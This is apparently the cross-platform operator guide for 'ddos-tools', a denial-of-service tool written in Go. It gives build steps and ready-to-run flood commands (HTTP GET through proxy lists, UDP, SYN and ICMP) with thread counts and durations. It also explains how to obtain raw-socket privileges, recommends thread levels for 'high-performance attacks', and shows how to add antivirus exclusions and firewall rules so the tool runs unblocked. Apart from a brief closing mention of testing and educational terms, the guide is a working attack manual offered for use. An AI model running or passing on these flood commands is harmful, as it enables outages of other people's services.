# Cross-Platform Usage Guide

**Maintained By**: Muhammad Thariq  
**Last Updated**: November 2025  
**Version**: 2.5 SNAPSHOT

---

## Overview

This guide provides platform-specific instructions for installing, building, and running ddos-tools on Linux, macOS, and Windows.

## Table of Contents

- [Platform Support](#platform-support)
- [Installation](#installation)
- [Building from Source](#building-from-source)
- [Running the Tool](#running-the-tool)
- [Platform-Specific Features](#platform-specific-features)
- [Command Syntax Differences](#command-syntax-differences)
- [File Paths](#file-paths)
- [Privilege Requirements](#privilege-requirements)
- [Performance Considerations](#performance-considerations)
- [Troubleshooting](#troubleshooting)

---

## Platform Support

ddos-tools is fully cross-platform and supports:

| Platform | Architectures | Status |
|----------|---------------|--------|
| **Linux** | amd64, arm64 | ✅ Fully Supported |
| **macOS** | amd64 (Intel), arm64 (Apple Silicon) | ✅ Fully Supported |
| **Windows** | amd64 | ✅ Fully Supported |

---

## Installation

### Prerequisites

**All Platforms:**
- Go 1.22 or higher (required for modern syntax features)
- Git

### Linux

#### Ubuntu/Debian

```bash
# Install Go
sudo apt update
sudo apt install golang-go git

# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools main.go

# Run
./ddos-tools HELP
```

#### Fedora/RHEL/CentOS

```bash
# Install Go
sudo dnf install golang git

# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools main.go

# Run
./ddos-tools HELP
```

#### Arch Linux

```bash
# Install Go
sudo pacman -S go git

# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools main.go

# Run
./ddos-tools HELP
```

---

### macOS

#### Using Homebrew (Recommended)

```bash
# Install Homebrew (if not installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Go
brew install go git

# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools main.go

# Run
./ddos-tools HELP
```

#### Using Official Installer

```bash
# Download from https://go.dev/dl/
# Install the .pkg file

# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools main.go

# Run
./ddos-tools HELP
```

#### macOS Security Note

If you see "cannot be opened because it is from an unidentified developer":

```bash
# Method 1: Remove quarantine attribute
xattr -d com.apple.quarantine ddos-tools

# Method 2: Allow in System Preferences
# System Preferences → Security & Privacy → General → Allow Anyway
```

---

### Windows

#### Using Chocolatey (Recommended)

```powershell
# Install Chocolatey (if not installed)
# Run PowerShell as Administrator
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# Install Go and Git
choco install golang git

# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools.exe main.go

# Run
.\ddos-tools.exe HELP
```

#### Using Official Installer

```powershell
# Download Go from https://go.dev/dl/
# Download Git from https://git-scm.com/download/win
# Install both .msi/.exe files

# Open PowerShell
# Verify installation
go version

# Clone and build
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools.exe main.go

# Run
.\ddos-tools.exe HELP
```

#### Using WSL (Windows Subsystem for Linux)

```bash
# Enable WSL and install Ubuntu
# Then follow Linux instructions
wsl --install -d Ubuntu

# Inside WSL
sudo apt update
sudo apt install golang-go git
git clone https://github.com/go-ddos-tools/ddos-tools.git
cd ddos-tools
go build -o ddos-tools main.go
./ddos-tools HELP
```

---

## Building from Source

### Standard Build

**Linux/macOS:**
```bash
go build -o ddos-tools main.go
```

**Windows (PowerShell):**
```powershell
go build -o ddos-tools.exe main.go
```

**Windows (Command Prompt):**
```cmd
go build -o ddos-tools.exe main.go
```

---

### Optimized Build (Smaller Binary)

**Linux/macOS:**
```bash
go build -ldflags="-s -w" -o ddos-tools main.go
```

**Windows:**
```powershell
go build -ldflags="-s -w" -o ddos-tools.exe main.go
```

---

### Cross-Compilation

Build for different platforms from any OS:

**Build for Linux (from any OS):**
```bash
GOOS=linux GOARCH=amd64 go build -o ddos-tools-linux main.go
```

**Build for macOS (from any OS):**
```bash
GOOS=darwin GOARCH=amd64 go build -o ddos-tools-mac-intel main.go
GOOS=darwin GOARCH=arm64 go build -o ddos-tools-mac-m1 main.go
```

**Build for Windows (from any OS):**
```bash
GOOS=windows GOARCH=amd64 go build -o ddos-tools.exe main.go
```

**Windows PowerShell cross-compilation:**
```powershell
$env:GOOS="linux"; $env:GOARCH="amd64"; go build -o ddos-tools-linux main.go
$env:GOOS="darwin"; $env:GOARCH="amd64"; go build -o ddos-tools-mac main.go
```

---

## Running the Tool

### Basic Execution

**Linux/macOS:**
```bash
# Make executable (first time only)
chmod +x ddos-tools

# Run
./ddos-tools HELP
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60
```

**Windows (PowerShell):**
```powershell
# Run directly
.\ddos-tools.exe HELP
.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
```

**Windows (Command Prompt):**
```cmd
REM Run directly
ddos-tools.exe HELP
ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
```

---

### With Elevated Privileges

Some methods (SYN, ICMP) require elevated privileges:

**Linux:**
```bash
sudo ./ddos-tools SYN 192.168.1.1:80 500 60
sudo ./ddos-tools ICMP 192.168.1.1:0 300 60
```

**macOS:**
```bash
sudo ./ddos-tools SYN 192.168.1.1:80 500 60
sudo ./ddos-tools ICMP 192.168.1.1:0 300 60
```

**Windows (PowerShell as Administrator):**
```powershell
# Right-click PowerShell → Run as Administrator
.\ddos-tools.exe SYN 192.168.1.1:80 500 60
.\ddos-tools.exe ICMP 192.168.1.1:0 300 60
```

**Windows (Command Prompt as Administrator):**
```cmd
REM Right-click Command Prompt → Run as Administrator
ddos-tools.exe SYN 192.168.1.1:80 500 60
ddos-tools.exe ICMP 192.168.1.1:0 300 60
```

---

## Platform-Specific Features

### Network Statistics (DSTAT tool)

**Linux:**
- Uses `/proc/net/dev` for network statistics
- Shows real-time RX/TX bytes and packets
- Most detailed statistics available

**macOS:**
- Uses system calls for network stats
- Similar to Linux but with different API

**Windows:**
- Uses Windows API (`GetIfTable2`, `FreeMibTable`)
- COM-based network monitoring
- Different data structure but same information

**Example:**
```bash
# Linux/macOS
./ddos-tools TOOLS
> DSTAT

# Windows
.\ddos-tools.exe TOOLS
> DSTAT
```

---

### Raw Socket Support

**Linux:**
- Full raw socket support with `sudo`
- CAP_NET_RAW capability can be used instead of root

**macOS:**
- Full raw socket support with `sudo`
- BPF (Berkeley Packet Filter) support

**Windows:**
- Raw socket support with Administrator privileges
- Requires Windows Firewall exceptions for some operations

---

## Command Syntax Differences

### General Pattern

| Platform | Prefix | Example |
|----------|--------|---------|
| Linux | `./` | `./ddos-tools HELP` |
| macOS | `./` | `./ddos-tools HELP` |
| Windows (PS) | `.\` | `.\ddos-tools.exe HELP` |
| Windows (CMD) | none or `.\` | `ddos-tools.exe HELP` |

---

### Complete Examples

**Layer 7 Attack:**

```bash
# Linux/macOS
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60

# Windows PowerShell
.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60

# Windows Command Prompt
ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60
```

**Layer 4 Attack:**

```bash
# Linux/macOS
./ddos-tools UDP 192.168.1.1:53 200 120

# Windows PowerShell
.\ddos-tools.exe UDP 192.168.1.1:53 200 120

# Windows Command Prompt
ddos-tools.exe UDP 192.168.1.1:53 200 120
```

**With Elevated Privileges:**

```bash
# Linux
sudo ./ddos-tools SYN 192.168.1.1:80 500 60

# macOS
sudo ./ddos-tools SYN 192.168.1.1:80 500 60

# Windows (as Administrator)
.\ddos-tools.exe SYN 192.168.1.1:80 500 60
```

---

## File Paths

### Proxy Files

**Linux/macOS:**
```bash
# Current directory
./ddos-tools GET http://example.com 5 100 proxies.txt 100 60

# Subdirectory (forward slashes)
./ddos-tools GET http://example.com 5 100 files/proxies/proxies.txt 100 60

# Absolute path
./ddos-tools GET http://example.com 5 100 /home/user/proxies.txt 100 60
```

**Windows (PowerShell):**
```powershell
# Current directory
.\ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60

# Subdirectory (forward or back slashes)
.\ddos-tools.exe GET http://example.com 5 100 files/proxies/proxies.txt 100 60
.\ddos-tools.exe GET http://example.com 5 100 files\proxies\proxies.txt 100 60

# Absolute path
.\ddos-tools.exe GET http://example.com 5 100 C:\Users\user\proxies.txt 100 60
```

**Windows (Command Prompt):**
```cmd
REM Current directory
ddos-tools.exe GET http://example.com 5 100 proxies.txt 100 60

REM Subdirectory (back slashes)
ddos-tools.exe GET http://example.com 5 100 files\proxies\proxies.txt 100 60

REM Absolute path
ddos-tools.exe GET http://example.com 5 100 C:\Users\user\proxies.txt 100 60
```

---

### Configuration Files

**All Platforms:**
The tool looks for `config.json` in the current directory.

**Linux/macOS:**
```bash
# Default location
./config.json

# Custom location (future feature)
./ddos-tools --config /path/to/config.json
```

**Windows:**
```powershell
# Default location
.\config.json

# Custom location (future feature)
.\ddos-tools.exe --config C:\path\to\config.json
```

---

## Privilege Requirements

### Methods Requiring Elevated Privileges

| Method | Linux | macOS | Windows |
|--------|-------|-------|---------|
| SYN | `sudo` | `sudo` | Administrator |
| ICMP | `sudo` | `sudo` | Administrator |
| All others | No privileges | No privileges | No privileges |

---

### Granting Privileges

**Linux (Permanent CAP_NET_RAW):**
```bash
# Grant capability (avoids sudo for each run)
sudo setcap cap_net_raw+ep ddos-tools

# Now run without sudo
./ddos-tools SYN 192.168.1.1:80 500 60
```

**macOS:**
```bash
# Always requires sudo for raw sockets
sudo ./ddos-tools SYN 192.168.1.1:80 500 60
```

**Windows:**
```powershell
# Run PowerShell as Administrator
# Right-click PowerShell → Run as Administrator
.\ddos-tools.exe SYN 192.168.1.1:80 500 60
```

---

## Performance Considerations

### Thread Limits by Platform

**Linux:**
- **Maximum threads**: 1000-5000 (system dependent)
- **Recommended Layer 7**: 100-500 threads
- **Recommended Layer 4**: 200-1000 threads
- **Best for**: High-performance attacks

**macOS:**
- **Maximum threads**: 500-2000 (system dependent)
- **Recommended Layer 7**: 100-400 threads
- **Recommended Layer 4**: 200-800 threads
- **Best for**: Balanced performance

**Windows:**
- **Maximum threads**: 500-2000 (system dependent)
- **Recommended Layer 7**: 50-300 threads
- **Recommended Layer 4**: 100-500 threads
- **Best for**: Stability over maximum speed

---

### Memory Usage

**Linux:**
- Lower memory overhead
- Better memory management
- Can handle more concurrent connections

**macOS:**
- Similar to Linux
- Efficient memory usage

**Windows:**
- Slightly higher memory overhead
- Consider reducing thread count if memory constrained

---

### Network Performance

**Linux:**
- Highest network throughput
- Most efficient I/O operations
- Best for bandwidth-intensive attacks

**macOS:**
- High network throughput
- Good I/O efficiency

**Windows:**
- Good network throughput
- Different I/O model (IOCP)
- May be slightly slower than Linux

---

## Troubleshooting

### Linux Issues

**Issue: Permission denied on SYN/ICMP**
```bash
# Solution: Use sudo
sudo ./ddos-tools SYN 192.168.1.1:80 500 60

# Or grant CAP_NET_RAW
sudo setcap cap_net_raw+ep ddos-tools
```

**Issue: Cannot execute binary**
```bash
# Solution: Make executable
chmod +x ddos-tools
```

**Issue: "command not found"**
```bash
# Solution: Use ./ prefix
./ddos-tools HELP
```

---

### macOS Issues

**Issue: "cannot be opened because it is from an unidentified developer"**
```bash
# Solution 1: Remove quarantine
xattr -d com.apple.quarantine ddos-tools

# Solution 2: System Preferences
# System Preferences → Security & Privacy → General → Allow
```

**Issue: Permission denied on network operations**
```bash
# Solution: Use sudo
sudo ./ddos-tools SYN 192.168.1.1:80 500 60
```

---

### Windows Issues

**Issue: "ddos-tools is not recognized"**
```powershell
# Solution: Use correct prefix
.\ddos-tools.exe HELP

# Or add to PATH
$env:Path += ";C:\path\to\ddos-tools"
ddos-tools.exe HELP
```

**Issue: Permission denied on SYN/ICMP**
```powershell
# Solution: Run as Administrator
# Right-click PowerShell → Run as Administrator
.\ddos-tools.exe SYN 192.168.1.1:80 500 60
```

**Issue: Windows Defender blocking**
```powershell
# Solution: Add exclusion
# Windows Security → Virus & threat protection → Exclusions → Add exclusion
# Add folder: C:\path\to\ddos-tools
```

**Issue: Firewall blocking connections**
```powershell
# Solution: Add firewall rule
New-NetFirewallRule -DisplayName "DDoS Tools" -Direction Outbound -Program "C:\path\to\ddos-tools.exe" -Action Allow
```

---

### Cross-Platform Tips

**Always use platform-appropriate syntax:**
- Linux/macOS: `./ddos-tools`
- Windows PS: `.\ddos-tools.exe`
- Windows CMD: `ddos-tools.exe`

**File paths:**
- Linux/macOS: Use `/` (forward slash)
- Windows: Use `\` (backslash) or `/` (PowerShell accepts both)

**Privileges:**
- Linux/macOS: Use `sudo`
- Windows: Run as Administrator

**Background execution:**
- Linux/macOS: Use `&`, `nohup`, `screen`, or `tmux`
- Windows: Use `Start-Process` or `Start-Job`

---

## Additional Resources

- **[USAGE.md](USAGE.md)** - Complete usage guide
- **[LAYER7-METHODS.md](LAYER7-METHODS.md)** - Layer 7 methods reference
- **[LAYER4-METHODS.md](LAYER4-METHODS.md)** - Layer 4 methods reference
- **[PROXIES.md](PROXIES.md)** - Proxy configuration guide
- **[README.md](../README.md)** - Project overview

---

## Platform-Specific Build Scripts

### Linux Build Script

**build.sh:**
```bash
#!/bin/bash
echo "Building ddos-tools for Linux..."
go build -ldflags="-s -w" -o ddos-tools main.go
chmod +x ddos-tools
echo "Build complete: ./ddos-tools"
```

---

### macOS Build Script

**build.sh:**
```bash
#!/bin/bash
echo "Building ddos-tools for macOS..."
go build -ldflags="-s -w" -o ddos-tools main.go
chmod +x ddos-tools
xattr -d com.apple.quarantine ddos-tools 2>/dev/null
echo "Build complete: ./ddos-tools"
```

---

### Windows Build Script

**build.ps1:**
```powershell
Write-Host "Building ddos-tools for Windows..."
go build -ldflags="-s -w" -o ddos-tools.exe main.go
Write-Host "Build complete: ddos-tools.exe"
```

**build.bat:**
```batch
@echo off
echo Building ddos-tools for Windows...
go build -ldflags="-s -w" -o ddos-tools.exe main.go
echo Build complete: ddos-tools.exe
pause
```

---

**Maintained By**: Muhammad Thariq  
**Last Updated**: November 2025  
**Copyright**: © 2025 Muhammad Thariq  
**License**: MIT with Educational Use Terms

**Remember**: This tool works seamlessly across all platforms. Choose the platform that best suits your testing environment and follow the platform-specific instructions above.